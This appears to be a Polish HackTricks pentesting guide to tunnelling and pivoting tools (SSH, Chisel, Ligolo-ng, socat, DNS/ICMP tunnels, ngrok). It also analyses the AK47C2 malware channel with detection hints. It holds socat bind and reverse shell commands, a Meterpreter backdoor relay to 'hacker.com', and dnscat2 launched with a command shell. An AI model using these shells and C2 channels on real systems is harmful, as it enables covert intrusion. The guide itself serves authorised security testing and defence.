# Tunelowanie i przekierowywanie portów

{{#include ../banners/hacktricks-training.md}}

## Wskazówka dotycząca Nmap

> [!WARNING]
> Obsługa proxy w Nmap jest ograniczona do połączeń TCP i nie wpływa na skanowanie ping, portów ani systemu operacyjnego. Gdy skaner znajduje się za proxy SOCKS, **wyłącz wykrywanie hostów** (`-Pn`) i użyj **skanowania TCP connect** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Ostateczne polecenie używa opcji `-u` i `-i` narzędzia Evil-WinRM do określenia konta i hosta WinRM; domyślny port WinRM to 5985.<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

OpenSSH może przekazywać połączenia X11, dowolne porty TCP oraz gniazda domeny Unix przez zaszyfrowany kanał.<sup>[[6]](#references)</sup>

Graficzne połączenie SSH (X)

`-Y` włącza zaufane przekazywanie X11, a `-C` żąda kompresji przekazywanych danych.<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

Otwórz nowy port na serwerze SSH --> Inny port

Zdalne przekierowanie (`-R`) nasłuchuje na serwerze SSH i łączy się z lokalną stroną; jawny adres powiązania określa, które interfejsy mogą uzyskać dostęp do tego listenera.<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Local port --> Compromised host (SSH) --> Third_box:Port

Forwarding lokalne (`-L`) nasłuchuje po stronie klienta i łączy się z miejscem docelowym od strony serwera SSH.<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Port lokalny --> Zaatakowany host (SSH) --> Dokądkolwiek

Dynamiczne przekierowanie (`-D`) tworzy lokalny listener SOCKS4/SOCKS5, którego połączenia są otwierane po stronie zdalnej.<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Jest to przydatne do uzyskiwania reverse shells z hostów wewnętrznych przez DMZ na Twój host:

Ustawienie `GatewayPorts` serwera określa, czy zdalne przekierowanie może być powiązane poza interfejsem loopback; jego domyślna wartość to `no`.<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Ten przykład oparty na uprawnieniach root tworzy urządzenia tun na obu hostach. Serwer musi zezwalać na przekazywanie tun, a wybrane konto musi mieć dostęp do urządzenia tun; `PermitRootLogin yes` to jeden ze sposobów użycia tutaj konta `root`.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Włącz przekazywanie po stronie serwera
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Ustaw nową trasę po stronie klienta
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Bezpieczeństwo – Terrapin Attack (CVE-2023-48795)**
> OpenSSH 9.6 dodał rozszerzenie strict-KEX w celu przeciwdziałania atakowi Terrapin na integralność wczesnej fazy transportu. W miarę możliwości zaktualizuj oba końce połączenia i stosuj się do zaleceń dostawcy w przypadku starszych implementacji, zamiast zakładać, że przekierowany kanał jest chroniony wyłącznie na podstawie wersji.<sup>[[8]](#references)</sup>

## SSHUTTLE

Możesz **tunelować** przez **ssh** cały **ruch** do **podsieci** za pośrednictwem hosta.\
Na przykład przekierowując cały ruch kierowany do 10.10.10.0/24

`sshuttle` zapewnia transparentne proxyowanie przez SSH i obsługuje wybór podsieci oraz niestandardowej komendy SSH, jak pokazano poniżej.<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Połącz się za pomocą klucza prywatnego
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

Metasploitowe `portfwd` obsługuje lokalne i zdalne przekierowywanie, natomiast jego moduł SOCKS proxy jest przeznaczony do pracy z trasami sesji lub `autoroute` i w tych przykładach nasłuchuje domyślnie na porcie 1080.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Lokalny port --> Zaatakowany host (aktywna sesja) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Inny sposób:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

Beacon w Cobalt Strike może przekazywać połączenia SOCKS4a/SOCKS5 przez Beacon; `rportfwd` nasłuchuje na zaatakowanym hoście, podczas gdy `rportfwd_local` inicjuje połączenie z celem z klienta Cobalt Strike.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Otwórz port na Team Server na interfejsach, przez które powinien być routowany ruch przez Beacon.<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> W tym przypadku **port jest otwierany na hoście Beacon**, a nie na Team Serverze, a ruch jest wysyłany do Team Servera, a stamtąd do wskazanego hosta:portu.<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Instrukcja reverse-forwarding odnotowuje następujące zachowanie:<sup>[[14]](#references)</sup>

- Reverse port forward w Beacon jest przeznaczony do **tunelowania ruchu do Team Server, a nie do przekazywania go między poszczególnymi maszynami**.
- Ruch jest **tunelowany w ramach ruchu C2 Beacon**, w tym przez połączenia P2P.
- Wysokie porty zwykle pozwalają uniknąć ograniczeń dotyczących portów uprzywilejowanych, ale nadal obowiązują zasady systemu operacyjnego celu oraz istniejące nasłuchujące usługi.

### rPort2Port local

> [!WARNING]
> W tym przypadku **port jest otwierany na hoście Beacon**, a nie na Team Server, a **ruch jest wysyłany do klienta Cobalt Strike** (nie do Team Server), a następnie stamtąd do wskazanego hosta:port.<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Projekt udostępnia endpointy web tunnel, takie jak `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` i `tunnel.php`; przed uruchomieniem lokalnego proxy prześlij jeden z obsługiwanych endpointów.<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Możesz pobrać go ze strony wydań [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel przesyła ruch TCP/UDP przez HTTP, korzystając z połączenia chronionego przez SSH; używaj zgodnych buildów klienta/serwera i sprawdź składnię poleceń wybranego wydania.<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Przekierowywanie portów
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Dokumentacja quickstart Ligolo-ng opisuje interfejs TUN na proxy, walidację odcisku certyfikatu dla agenta oraz konfigurację routingu dla tunelowanej sieci.<sup>[[17]](#references)</sup>

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Powiązanie i nasłuchiwanie agenta

Ligolo-ng może dodawać listenery na agencie, które przekierowują ruch do adresu po stronie proxy, a jego zarezerwowany zakres `240.0.0.0/4` można routować, aby uzyskać dostęp do usług lokalnych agenta.<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Dostęp do lokalnych portów agenta
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot uruchamia reverse tunnel z systemu ofiary i udostępnia proxy SOCKS4 na adresie loopback atakującego; jego README opisuje również dane uwierzytelniające proxy NTLM oraz opcje hash.<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivotowanie przez **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat łączy typy adresów, takie jak `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` i `PROXY`; poniższe przykłady łączą te udokumentowane endpointy.<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port przez socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter przez SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Możesz przejść przez **nieuwierzytelniony proxy** za pomocą udokumentowanego typu adresu `PROXY` narzędzia socat, wykonując tę linię zamiast ostatniej w konsoli ofiary.<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Utwórz certyfikaty po obu stronach: Client i Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Połącz lokalny port SSH (22) z portem 443 hosta atakującego
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Plink to narzędzie wiersza poleceń PuTTY do nawiązywania połączeń, z opcjami przekierowania SSH podobnymi do `ssh`.<sup>[[22]](#references)</sup>

Użyj wielkiej litery `-P` dla portu SSH. `-pw` jest zachowane dla zgodności, ale ujawnia hasło na liście procesów; w miarę możliwości preferuj uwierzytelnianie za pomocą klucza lub `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>

Ponieważ ten plik binarny zostanie uruchomiony na komputerze ofiary i jest klientem SSH, otwórz usługę SSH oraz port dla połączenia zwrotnego; poniższy przykład używa `-R` do przekierowania lokalnie dostępnego portu na komputer atakującego.<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Podczas tworzenia lub zmiany trwałych reguł `portproxy` użyj kontekstu z uprawnieniami wymaganymi przez hosta. Firma Microsoft dokumentuje użyte poniżej formy `v4tov4` poleceń add, show i delete.<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Musisz mieć **dostęp RDP do systemu**.\
Pobierz:

SocksOverRDP używa Remote Desktop Dynamic Virtual Channels do przesyłania połączenia SOCKS5 przez istniejącą sesję RDP; plugin klienta nasłuchuje na `127.0.0.1:1080`, a komponent serwera działa na celu RDP.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Pliki binarne](https://github.com/nccgroup/SocksOverRDP/releases) - To narzędzie używa `Dynamic Virtual Channels` (`DVC`) z funkcji Remote Desktop Service systemu Windows. DVC odpowiada za **tunelowanie pakietów przez połączenie RDP**.
2. [Przenośny plik binarny Proxifier](https://www.proxifier.com/download/#win-tab)

Na komputerze klienta załaduj **`SocksOverRDP-Plugin.dll`** w następujący sposób:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Teraz możemy **połączyć się** z **ofiarą** przez **RDP** za pomocą **`mstsc.exe`**, a następnie powinniśmy otrzymać **monit** informujący, że **wtyczka SocksOverRDP jest włączona** i będzie **nasłuchiwać** na **127.0.0.1:1080**.

**Połącz się** przez **RDP** i prześlij oraz uruchom na komputerze ofiary plik binarny `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Teraz potwierdź na swojej maszynie (atakującej), że port 1080 nasłuchuje:
```
netstat -antb | findstr 1080
```
Teraz możesz użyć [**Proxifier**](https://www.proxifier.com/), aby przekierować ruch przez ten port.<sup>[[26]](#references)</sup>

## Proxify aplikacje GUI Windows

Możesz sprawić, aby aplikacje GUI Windows korzystały z proxy za pomocą [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
W **Profile -> Proxy Servers** dodaj adres IP i port serwera SOCKS.\
W **Profile -> Proxification Rules** dodaj nazwę programu, dla którego chcesz użyć proxy, oraz połączenia z adresami IP, dla których chcesz użyć proxy; reguły Proxifier mogą dopasowywać aplikacje, hosty docelowe i porty.<sup>[[27]](#references)</sup>

## Tunelowanie przez proxy NTLM

Wspomniane wcześniej narzędzie, **Rpivot**, może przekazywać ruch przez proxy uwierzytelniające się za pomocą NTLM. **OpenVPN** również może przekierowywać ruch przez takie proxy po skonfigurowaniu pliku uwierzytelniania i metody NTLMv2; jest to przechodzenie przez proxy, a nie omijanie uwierzytelniania proxy.<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm uwierzytelnia się w nadrzędnych proxy NTLM, udostępnia lokalne listenery i może mapować lokalny port tunelu na usługę docelową; klienci mogą następnie korzystać z tego lokalnego portu.<sup>[[29]](#references)</sup>\
Na przykład przekierowanie portu 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Teraz, jeśli na przykład ustawisz usługę **SSH** na hoście ofiary tak, aby nasłuchiwała na porcie 443, możesz połączyć się z nią przez port 2222 atakującego.<sup>[[29]](#references)</sup>\
Możesz również użyć **meterpreter**, który łączy się z localhost:443, podczas gdy atakujący nasłuchuje na porcie 2222.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) to zestaw narzędzi Microsoftu do tworzenia reverse proxy na platformie .NET. Znajdziesz go tutaj: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine tworzy tunel IPv4 za pośrednictwem zapytań DNS i używa interfejsów TUN; udokumentowana konfiguracja wymaga uprawnień niezbędnych do utworzenia tych interfejsów po obu stronach.<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Transport DNS ma większy narzut niż bezpośredni TCP i zazwyczaj jest wolny; możesz utworzyć skompresowane połączenie SSH przez ten tunel, używając:<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Pobierz stąd**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 ustanawia zaszyfrowany kanał command-and-control przez DNS; poniższe polecenia serwera i klienta są zgodne z udokumentowanym użyciem.<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **W PowerShell**

Możesz użyć [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell), aby uruchomić klienta dnscat2 w PowerShellu; jego README opisuje parametry `Start-Dnscat2` przedstawione poniżej.<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Przekierowanie portów za pomocą dnscat**

Interaktywne polecenie `listen` w dnscat2 mapuje lokalny listener na zdalny host i port.<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Zmiana DNS proxychains

Proxychains-ng przechwytuje dynamicznie linkowane połączenia TCP i nie obsługuje UDP ani ICMP; proxyowanie DNS można konfigurować, dlatego należy sprawdzić zainstalowany plik `proxychains.conf` oraz helper resolvera, zamiast zakładać stały publiczny resolver. Starsze skrypty `proxyresolv` udostępniają `PROXY_DNS_SERVER` do wyboru resolvera; gdy wymagane są nazwy wewnętrzne, należy użyć resolvera osiągalnego z pivotu.<sup>[[34]](#references)[[35]](#references)</sup>

## Tunneling w Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Aktor Storm-2603 utworzył **dual-channel C2 ("AK47C2")**, który nadużywa *wyłącznie* wychodzącego ruchu **DNS** i **zwykłego HTTP POST** – dwóch protokołów, które rzadko są blokowane w sieciach firmowych.<sup>[[2]](#references)</sup>

1. **Tryb DNS (AK47DNS)**
• Generuje losowy 5-znakowy SessionID (np. `H4T14`).
• Dodaje `1` dla *żądań zadań* lub `2` dla *wyników*, a następnie łączy różne pola (flagi, SessionID, nazwa komputera).
• Każde pole jest **szyfrowane XOR-em z kluczem ASCII `VHBD@H`**, kodowane szesnastkowo i łączone kropkami – całość kończy się domeną kontrolowaną przez atakującego:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Żądania używają `DnsQuery()` dla rekordów **TXT** (oraz zapasowych rekordów **MG**).
• Gdy odpowiedź przekracza 0xFF bajtów, backdoor **dzieli** dane na fragmenty po 63 bajty i wstawia znaczniki:
`s<SessionID>t<TOTAL>p<POS>`, aby serwer C2 mógł uporządkować fragmenty.

2. **Tryb HTTP (AK47HTTP)**
• Tworzy kopertę JSON:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Cały blob jest przetwarzany przez XOR z `VHBD@H` → kodowany szesnastkowo → i wysyłany w treści **`POST /`** z nagłówkiem `Content-Type: text/plain`.
• Odpowiedź używa tego samego kodowania, a pole `cmd` jest wykonywane za pomocą `cmd.exe /c <command> 2>&1`.

Notatki Blue Team
• Należy szukać nietypowych **zapytań TXT**, których pierwsza etykieta jest długim ciągiem szesnastkowym i które zawsze kończą się tą samą rzadką domeną.
• Stały klucz XOR, a następnie ASCII-hex, jest łatwy do wykrycia za pomocą YARA: `6?56484244?484` (`VHBD@H` w zapisie szesnastkowym).
• W przypadku HTTP należy oznaczać treści żądań POST typu text/plain, które składają się wyłącznie z wartości szesnastkowych i mają długość będącą wielokrotnością dwóch bajtów.

{{#note}}
Kanał utrzymuje każdą etykietę subdomeny w limicie 63 oktetów DNS, ale sama zgodność z protokołem nie czyni go niewykrywalnym; rzadkie domeny, długie etykiety szesnastkowe i duża liczba zapytań nadal są sygnałami detekcyjnymi.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## Tunneling ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans opisuje tunel IPv4-over-ICMP wykorzystujący urządzenie TUN i żądania echo ICMP; konfiguracja wymaga uprawnień wystarczających do utworzenia interfejsu.<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Pobierz go stąd**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng przesyła połączenia TCP przez ICMP i używa przedstawionych poniżej opcji `-p`, `-l`, `-r` oraz `-R` odpowiednio dla proxy, lokalnego listenera, hosta docelowego i portu docelowego.<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) to agent umożliwiający udostępnianie lokalnych usług sieciowych online przez bezpieczny tunel; jego CLI dokumentuje endpointy HTTP, TCP i file URL, a wyświetlana nazwa hosta endpointu może różnić się w zależności od endpointu i konta.<sup>[[39]](#references)</sup>

### Instalacja

- Utwórz konto: https://ngrok.com/signup
- Pobieranie klienta:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Podstawowe zastosowania

**Dokumentacja:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_The agent obsługuje również opcje uwierzytelniania i TLS, gdy są potrzebne.<sup>[[39]](#references)</sup>_

#### Tunelowanie TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Udostępnianie plików za pomocą HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_Przydatne w przypadku XSS,SSRF,SSTI ..._\
Standalone agent domyślnie udostępnia interfejs inspekcji HTTP pod adresem `http://127.0.0.1:4040`; interfejs służy do obsługi ruchu HTTP.<sup>[[40]](#references)</sup>

#### Tunneling internal HTTP service

Opcja `--host-header=rewrite` przepisuje nagłówek upstream HTTP `Host`, aby odpowiadał lokalnej usłudze.<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Prosty przykład konfiguracji ngrok.yaml

Wykorzystuje to ngrok Agent Config v2; nazwane tunele używają `proto` i `addr` i są uruchamiane za pomocą `ngrok start`.<sup>[[42]](#references)</sup> Otwiera 3 tunele:

- 2 TCP
- 1 HTTP z udostępnianiem plików statycznych z /tmp/httpbin/
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Konektor `cloudflared` usługi Cloudflare Tunnel ustanawia połączenia wychodzące; opublikowane aplikacje mogą obsługiwać HTTP, HTTPS, TCP, SSH i RDP, natomiast quick tunnels są przeznaczone do tworzenia aplikacji HTTP.<sup>[[43]](#references)[[45]](#references)</sup>

### Jednolinijkowe uruchomienie Quick tunnel
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### Origin SOCKS5 (tryb legacy)

Flaga legacy `--socks5` informuje `cloudflared`, że lokalny origin obsługuje SOCKS5; nie tworzy lokalnego listenera SOCKS5. W przypadku managed tunnel konfiguracja `originRequest.proxyType: socks` konfiguruje obsługę origin SOCKS5.<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
